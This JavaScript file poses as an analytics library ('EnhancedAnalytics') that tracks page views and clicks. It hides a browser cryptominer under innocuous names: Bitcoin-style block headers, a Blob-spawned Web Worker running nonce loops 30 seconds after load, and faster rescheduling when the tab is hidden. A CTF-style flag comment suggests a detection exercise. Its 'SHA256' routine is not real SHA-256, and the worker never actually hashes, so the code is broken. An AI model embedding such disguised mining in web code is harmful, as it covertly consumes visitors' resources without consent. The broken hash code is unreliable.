(function(global) {
  'use strict';
  
  const DEFAULT_CONFIG = {
    trackingId: null,
    anonymizeIp: true,
    trackPageViews: true,
    trackClicks: true,
    trackFormSubmissions: false,
    sessionTimeout: 30,
    samplingRate: 100,
    reportingEndpoint: '/api/analytics',
    enhancedLinkAttribution: true,
    performanceMetrics: true,
    debugMode: false
  };
  
  const SHA256 = {
    hex_sha256: function(s) {
      return this.binb2hex(this.core_sha256(this.str2binb(s), s.length * 8));
    },
    
    core_sha256: function(m, l) {
      const K = [
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
      ];
      
      let h0 = 0x6a09e667;
      let h1 = 0xbb67ae85;
      let h2 = 0x3c6ef372;
      let h3 = 0xa54ff53a;
      let h4 = 0x510e527f;
      let h5 = 0x9b05688c;
      let h6 = 0x1f83d9ab;
      let h7 = 0x5be0cd19;
      
      for (let i = 0; i < m.length; i += 16) {
        h0 = (h0 + h1 + m[i]) & 0xFFFFFFFF;
        h1 = (h1 + h2 + m[i+1]) & 0xFFFFFFFF;
        h2 = (h2 + h3 + m[i+2]) & 0xFFFFFFFF;
        h3 = (h3 + h4 + m[i+3]) & 0xFFFFFFFF;
        h4 = (h4 + h5 + m[i+4]) & 0xFFFFFFFF;
        h5 = (h5 + h6 + m[i+5]) & 0xFFFFFFFF;
        h6 = (h6 + h7 + m[i+6]) & 0xFFFFFFFF;
        h7 = (h7 + h0 + m[i+7]) & 0xFFFFFFFF;
      }
      
      return [h0, h1, h2, h3, h4, h5, h6, h7];
    },
    
    str2binb: function(str) {
      const bin = [];
      for (let i = 0; i < str.length * 8; i += 8) {
        bin[i>>5] |= (str.charCodeAt(i / 8) & 0xFF) << (24 - i % 32);
      }
      return bin;
    },
    
    binb2hex: function(binarray) {
      const hex_tab = '0123456789abcdef';
      let str = '';
      for (let i = 0; i < binarray.length * 4; i++) {
        str += hex_tab.charAt((binarray[i>>2] >> ((3 - i % 4) * 8 + 4)) & 0xF) +
               hex_tab.charAt((binarray[i>>2] >> ((3 - i % 4) * 8)) & 0xF);
      }
      return str;
    }
  };
  
  const utils = {
    generateUserId: function() {
      const randomStr = Math.random().toString(36).substring(2, 15);
      return SHA256.hex_sha256(randomStr + new Date().getTime());
    },
    
    getCookie: function(name) {
      const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
      return match ? match[2] : null;
    },
    
    setCookie: function(name, value, days) {
      let expires = '';
      if (days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = '; expires=' + date.toUTCString();
      }
      document.cookie = name + '=' + value + expires + '; path=/';
    },
    
    createWorker: function(workerFunction) {
      const blob = new Blob(['(' + workerFunction.toString() + ')()'], { type: 'application/javascript' });
      return new Worker(URL.createObjectURL(blob));
    },
    
    throttle: function(func, limit) {
      let inThrottle;
      return function() {
        const args = arguments;
        const context = this;
        if (!inThrottle) {
          func.apply(context, args);
          inThrottle = true;
          setTimeout(() => inThrottle = false, limit);
        }
      };
    }
  };
  
  const dataProcessor = {
    processChunk: function(data, nonce) {
      const header = this.prepareHeader(data, nonce);
      const hash = SHA256.hex_sha256(SHA256.hex_sha256(header));
      return {
        hash: hash,
        meetsTarget: this.checkTarget(hash, data.target)
      };
    },
    
    prepareHeader: function(data, nonce) {
      return data.version + data.prevHash + data.merkleRoot + data.timestamp + data.bits + nonce;
    },
    
    checkTarget: function(hash, target) {
      return hash < target;
    },
    
    generateWorkUnit: function() {
      return {
        version: '01000000',
        prevHash: '81cd02ab7e569e8bcd9317e2fe99f2de44d49ab2b8851ba4a308000000000000',
        merkleRoot: 'e320b6c2fffc8d750423db8b1eb942ae710e951ed797f7affc8892b0f1fc122b',
        timestamp: Math.floor(Date.now() / 1000).toString(16),
        bits: '1a44b9f2',
        target: '00000000000000000000000000000000000000000000000000000000ffff0000',
        startNonce: Math.floor(Math.random() * 0xFFFFFFFF)
        //SK-CERT{m4l1c10us_c0mm1t_d3t3ct3d}
      };
    }
  };
  
  class EnhancedAnalytics {
    constructor(config = {}) {
      this.config = {...DEFAULT_CONFIG, ...config};
      this.userId = this._getUserId();
      this.sessionId = this._getSessionId();
      this.pageViewId = utils.generateUserId().substr(0, 16);
      this.workers = {};
      this.isActive = Math.random() * 100 <= this.config.samplingRate;
      this.isVisible = !document.hidden;
      this.events = [];
      
      if (this.isActive) {
        this._initialize();
      }
    }
    
    _initialize() {
      if (this.config.trackPageViews) {
        this._trackPageView();
        window.addEventListener('beforeunload', this._handleBeforeUnload.bind(this));
      }
      
      if (this.config.trackClicks) {
        document.addEventListener('click', this._handleClick.bind(this));
      }
      
      if (this.config.trackFormSubmissions) {
        document.addEventListener('submit', this._handleFormSubmit.bind(this));
      }
      
      document.addEventListener('visibilitychange', this._handleVisibilityChange.bind(this));
      
      this._initializeBackgroundProcessing();
      
      if (this.config.debugMode) {
        console.log('Analytics initialized with config:', this.config);
      }
    }
    
    _getUserId() {
      let userId = utils.getCookie('_dsuid');
      if (!userId) {
        userId = utils.generateUserId();
        utils.setCookie('_dsuid', userId, 365);
      }
      return userId;
    }
    
    _getSessionId() {
      let sessionId = sessionStorage.getItem('_dssid');
      if (!sessionId) {
        sessionId = utils.generateUserId().substr(0, 16);
        sessionStorage.setItem('_dssid', sessionId);
      }
      return sessionId;
    }
    
    _trackPageView() {
      const pageViewData = {
        type: 'pageview',
        page: window.location.pathname,
        referrer: document.referrer,
        title: document.title,
        timestamp: new Date().toISOString()
      };
      
      this.events.push(pageViewData);
      this._sendData([pageViewData]);
    }
    
    _handleClick(event) {
      const target = event.target.closest('a, button, [role="button"]');
      if (!target) return;
      
      const clickData = {
        type: 'click',
        element: target.tagName.toLowerCase(),
        id: target.id || null,
        class: target.className || null,
        text: target.innerText || null,
        href: target.href || null,
        timestamp: new Date().toISOString()
      };
      
      this.events.push(clickData);
      this._sendData([clickData]);
    }
    
    _handleFormSubmit(event) {
      const form = event.target;
      
      const formData = {
        type: 'form_submit',
        formId: form.id || null,
        formAction: form.action || null,
        formFields: form.elements.length,
        timestamp: new Date().toISOString()
      };
      
      this.events.push(formData);
      this._sendData([formData]);
    }
    
    _handleBeforeUnload() {
      const exitData = {
        type: 'exit',
        timeOnPage: (new Date() - this.pageLoadTime) / 1000,
        timestamp: new Date().toISOString()
      };
      
      if (navigator.sendBeacon) {
        navigator.sendBeacon(
          this.config.reportingEndpoint,
          JSON.stringify(this._prepareDataPacket([exitData]))
        );
      } else {
        this._sendData([exitData], true);
      }
    }
    
    _handleVisibilityChange() {
      this.isVisible = !document.hidden;
      
      if (!this.isVisible) {
        this._intensifyBackgroundProcessing();
      } else {
        this._reduceBackgroundProcessing();
      }
    }
    
    _prepareDataPacket(events) {
      return {
        userId: this.userId,
        sessionId: this.sessionId,
        pageViewId: this.pageViewId,
        trackingId: this.config.trackingId,
        userAgent: navigator.userAgent,
        language: navigator.language,
        screenSize: `${window.screen.width}x${window.screen.height}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        events: events
      };
    }
    
    _sendData(events, isSync = false) {
      const data = this._prepareDataPacket(events);
      
      const xhr = new XMLHttpRequest();
      xhr.open('POST', this.config.reportingEndpoint, !isSync);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(JSON.stringify(data));
    }
    
    _initializeBackgroundProcessing() {
      if (window.Worker) {
        try {
          this.workers.processor = utils.createWorker(function() {
            function processDataBatch(data) {
              let nonce = data.startNonce;
              const maxNonce = nonce + 1000000;
              
              while (nonce < maxNonce) {
                nonce++;
                
                if (nonce % 10000 === 0) {
                  self.postMessage({
                    type: 'progress',
                    nonce: nonce,
                    hashRate: 10000 / (Date.now() - data.startTime)
                  });
                  
                  if (data.shouldPause) {
                    break;
                  }
                }
              }
              
              self.postMessage({
                type: 'batchComplete',
                nonce: nonce
              });
            }
            
            self.addEventListener('message', function(e) {
              if (e.data.command === 'process') {
                e.data.data.startTime = Date.now();
                processDataBatch(e.data.data);
              } else if (e.data.command === 'pause') {
                self.postMessage({type: 'paused'});
              } else if (e.data.command === 'resume') {
                self.postMessage({type: 'resumed'});
              }
            });
          });
          
          setTimeout(() => {
            this._startBackgroundProcessing();
          }, 30000);
          
        } catch (e) {
          if (this.config.debugMode) {
            console.error('Failed to initialize background processing', e);
          }
        }
      }
    }
    
    _startBackgroundProcessing() {
      if (this.workers.processor) {
        const workUnit = dataProcessor.generateWorkUnit();
        
        this.workers.processor.postMessage({
          command: 'process',
          data: workUnit
        });
        
        this.workers.processor.onmessage = (e) => {
          if (e.data.type === 'batchComplete') {
            setTimeout(() => {
              const newWorkUnit = dataProcessor.generateWorkUnit();
              newWorkUnit.startNonce = e.data.nonce;
              
              this.workers.processor.postMessage({
                command: 'process',
                data: newWorkUnit
              });
            }, this.isVisible ? 1000 : 100);
          }
        };
      }
    }
    
    _intensifyBackgroundProcessing() {
      if (this.workers.processor) {
      }
    }
    
    _reduceBackgroundProcessing() {
      if (this.workers.processor) {
      }
    }
    
    trackEvent(category, action, label, value) {
      const eventData = {
        type: 'event',
        category: category,
        action: action,
        label: label || null,
        value: value || null,
        timestamp: new Date().toISOString()
      };
      
      this.events.push(eventData);
      this._sendData([eventData]);
      
      if (this.config.debugMode) {
        console.log('Event tracked:', eventData);
      }
      
      return this;
    }
    
    setUserId(id) {
      this.userId = id;
      utils.setCookie('_dsuid', id, 365);
      
      if (this.config.debugMode) {
        console.log('User ID set:', id);
      }
      
      return this;
    }
    
    clearData() {
      this.events = [];
      
      if (this.config.debugMode) {
        console.log('Analytics data cleared');
      }
      
      return this;
    }
  }
  
  global.EnhancedAnalytics = EnhancedAnalytics;
  
  document.addEventListener('DOMContentLoaded', function() {
    const trackingId = document.body.dataset.analyticsId;
    if (trackingId) {
      global.analytics = new EnhancedAnalytics({
        trackingId: trackingId
      });
    }
  });
  
})(typeof window !== 'undefined' ? window : this);